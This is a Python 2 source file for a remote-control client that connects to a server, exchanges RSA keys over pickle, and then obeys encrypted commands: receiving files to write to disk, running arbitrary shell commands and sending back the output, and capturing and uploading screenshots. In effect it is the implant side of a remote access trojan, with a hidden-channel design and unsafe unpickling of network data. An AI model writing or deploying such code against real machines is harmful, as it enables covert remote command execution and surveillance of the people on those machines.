'''
Created on Mar 3, 2015

@author: gcharan09
'''

import pickle
import pyscreenshot as ImageGrab
import socket
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode 
import time
import subprocess

class Remoteclient:
    
    def __init__(self):
        
        self.host="localhost"
        self.port=12345
        
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            print "Socket Created Successfully"
        except socket.error:
            print "unable to create socket"
    
    def __genKey(self):
        self.RSAKey=RSA.generate(2048,e=65537)
        print "Key generation successful"
        return self.RSAKey
    
    def exchangeKeys(self):
        
        clientKey=self.__genKey()
        self.sock.connect((self.host,self.port))
        print "connected to server\n"
        serverReply=self.sock.recv(2048)
        print "received server Key\n"
        serverKey = pickle.loads(serverReply)
        with open("serverKey",'wb') as f:
            f.write(serverKey.exportKey())
        self.sock.sendall(pickle.dumps(self.RSAKey.publickey()))
        print "Key Exchange Successful\n"

    def Operations(self):
        
        self.exchangeKeys()
        while True:
            cmd=PKCS1_OAEP.new(self.RSAKey).decrypt((b64decode(pickle.loads(self.sock.recv(4096)))))
            if cmd:
                cmd=cmd.strip('~')
            else:
                print "server closed connection"
            
            
            if cmd=="FT":
                rdata=""
                filename= self.receiveData()
                while True:
                    buf=(self.receiveData())
                    if buf=="QUIT":
                        break
                    else:
                        rdata+=buf
                with open(filename,'wb') as f:
                    f.write(rdata)
            
            
            elif cmd=="EFS":
                print "inside EFS"
                print self.receiveData()
                self.sendData("Send EFS Key")
                self.sendData('QUIT')
                
                
            elif cmd=="CMD":
                cmd =(self.receiveData()).strip('~')
                print "received command is : "+cmd
                p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
                stdout, stderr= p.communicate()
                if str(stderr)=="None":
                    print "inside stdout"
                    self.sendData(stdout)
                    self.sendData("QUIT")
                else:
                    self.sendData("Error Occured, Error Code is: "+str(stderr))
                
            
            elif cmd=="SCP":
                print "Taking screenshot"
                ImageGrab.grab_to_file('testImage.png')
                f=open('testImage.png','rb')
                for filecontent in self.readFileinChunk(f):
                    self.sendData(filecontent)
                self.sendData("QUIT")
                print "Screenshot sent successfully"
            
            
            else:
                print "inside else block"
                print self.receiveData()
    
    def readFileinChunk(self, obj, chunk_size=5461):
        while True:
            data=obj.read(chunk_size)
            if not data:
                break
            yield data
    
            
    def receiveData(self):
        while 1:
            buf = self.sock.recv(8192)
            if buf:
                encmessage = b64decode(pickle.loads(buf))
                msg= PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
                msg=msg.strip('~')
                return msg
            else:
                print "client closed connection"
                break
        self.sock.close()
                
    def sendData(self, data):
        count=0
        key = open("serverKey", "r").read() 
        serverKey= RSA.importKey(key)
        serverKey = PKCS1_OAEP.new(serverKey)
        print len(data)
        if(len(data)>200):
            for i in range(200,len(data),200):
                count=count+1
                secretText = serverKey.encrypt(data[i-200:i])
                time.sleep(0.5)
                self.sock.sendall(pickle.dumps(secretText.encode('base64')))
            secretText=serverKey.encrypt(data[(i):len(data)])
            time.sleep(0.5)
            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
            print count
            print "sent large data"
        else:
            print data
            while len(data)<200:
                data+='~'
            secretText=serverKey.encrypt(data)
            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
            print "sent small data"
            


if __name__ == '__main__':
    clientObj=Remoteclient()
    clientObj.Operations()